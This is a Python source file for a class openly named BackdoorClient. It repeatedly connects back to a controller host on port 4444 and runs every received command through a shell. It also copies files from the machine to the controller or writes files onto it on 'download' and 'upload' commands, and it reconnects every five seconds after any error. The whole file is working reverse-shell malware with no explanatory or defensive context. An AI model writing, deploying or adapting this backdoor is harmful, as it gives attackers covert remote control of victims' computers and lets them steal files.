import socket
import subprocess
import os
import time

SERVER_URL = "127.0.0.1"
PORT = 4444

class BackdoorClient:
    def __init__(self, host=SERVER_URL, port=PORT):
        self.host = host
        self.port = port
        self.buffer_size = 4096

    def execute_command(self, command):
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return output.decode()
        except subprocess.CalledProcessError as e:
            return e.output.decode()
        except Exception as e:
            return str(e)

    def send_file(self, client_socket, filename):
        try:
            if not os.path.exists(filename):
                return "[!] File not found"

            file_size = os.path.getsize(filename)
            client_socket.send(str(file_size).encode())

            client_socket.recv(self.buffer_size)

            with open(filename, 'rb') as f:
                data = f.read()
                client_socket.send(data)
            
            return "[+] File sent successfully"
        except Exception as e:
            return f"[!] Error sending file: {str(e)}"

    def receive_file(self, client_socket, filename):
        try:
            file_size = int(client_socket.recv(self.buffer_size).decode())
            client_socket.send("Ready".encode())  
            
            received_data = b""
            while len(received_data) < file_size:
                data = client_socket.recv(self.buffer_size)
                if not data:
                    break
                received_data += data

            with open(filename, 'wb') as f:
                f.write(received_data)
            return "[+] File received successfully"
        except Exception as e:
            return f"[!] Error receiving file: {str(e)}"

    def connect(self):
        while True:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect((self.host, self.port))
                
                while True:
                    command = client.recv(self.buffer_size).decode()
                    
                    if command.lower() == 'exit':
                        break

                    if command.startswith('download'):
                        _, filepath = command.split(' ')
                        response = self.send_file(client, filepath)
                    elif command.startswith('upload'):
                        _, filepath = command.split(' ')
                        response = self.receive_file(client, filepath)
                    else:
                        response = self.execute_command(command)
                    
                    client.send(response.encode())

            except Exception as e:
                print(f"[!] Error: {str(e)}")
                time.sleep(5)  
                continue
            finally:
                client.close()

if __name__ == "__main__":
    client = BackdoorClient()
    client.connect()